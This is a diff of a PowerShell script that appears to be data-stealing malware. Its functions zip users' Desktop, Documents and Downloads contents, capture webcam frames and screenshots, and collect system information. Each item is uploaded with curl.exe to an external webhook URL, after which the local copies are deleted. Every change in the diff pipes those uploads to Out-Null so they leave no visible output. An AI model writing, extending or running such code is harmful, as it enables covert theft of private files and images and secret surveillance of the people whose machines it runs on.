@@ -112,7 +112,7 @@ tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
 $FilePath ="$env:temp/TreesOfKnowledge.zip"
 Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt -DestinationPath $FilePath
 sleep 1
-curl.exe -F file1=@"$FilePath" $hookurl
+curl.exe -F file1=@"$FilePath" $hookurl | Out-Null
 rm -Path $FilePath -Force
 Write-Output "Done."
 }
@@ -131,11 +131,11 @@ if (Test-Path -Path $path){
         $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
         Add-Type -AssemblyName System.IO.Compression.FileSystem
         [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
-        curl.exe -F file1=@"$tempZipFilePath" $hookurl
+        curl.exe -F file1=@"$tempZipFilePath" $hookurl | Out-Null
         sleep 1
         Rm -Path $tempZipFilePath -Recurse -Force
     }else{
-        curl.exe -F file1=@"$Path" $hookurl
+        curl.exe -F file1=@"$Path" $hookurl | Out-Null
     }
 }
 }
@@ -254,7 +254,7 @@ foreach ($folder in $foldersToSearch) {
             if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                 $zipArchive.Dispose()
                 $currentZipSize = 0
-                curl.exe -F file1=@"$zipFilePath" $hookurl
+                curl.exe -F file1=@"$zipFilePath" $hookurl | Out-Null
                 Sleep 1
                 Remove-Item -Path $zipFilePath -Force
                 $index++
@@ -275,7 +275,7 @@ foreach ($folder in $foldersToSearch) {
     }
 }
 $zipArchive.Dispose()
-curl.exe -F file1=@"$zipFilePath" $hookurl
+curl.exe -F file1=@"$zipFilePath" $hookurl | Out-Null
 sleep 5
 Remove-Item -Path $zipFilePath -Force
 }
@@ -359,7 +359,7 @@ Sleep 1
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$infomessage"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
 
-curl.exe -F file1=@"$outpath" $hookurl
+curl.exe -F file1=@"$outpath" $hookurl | Out-Null
 Sleep 1
 Remove-Item -Path $outpath -force
 }
@@ -427,7 +427,7 @@ if ($videoDevice) {
     & $ffmpegPath -f dshow -i video="$videoInput" -frames:v 1 $outputFile -y
 } else {
 }
-    curl.exe -F "file1=@$outputFile" $hookurl
+    curl.exe -F "file1=@$outputFile" $hookurl | Out-Null
     sleep 1
     Remove-Item -Path $outputFile -Force
 }
@@ -446,7 +446,7 @@ $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
 $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
 $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
 Start-Sleep 1
-curl.exe -F "file1=@$filett" $hookurl
+curl.exe -F "file1=@$filett" $hookurl | Out-Null
 Start-Sleep 1
 Remove-Item -Path $filett
 }
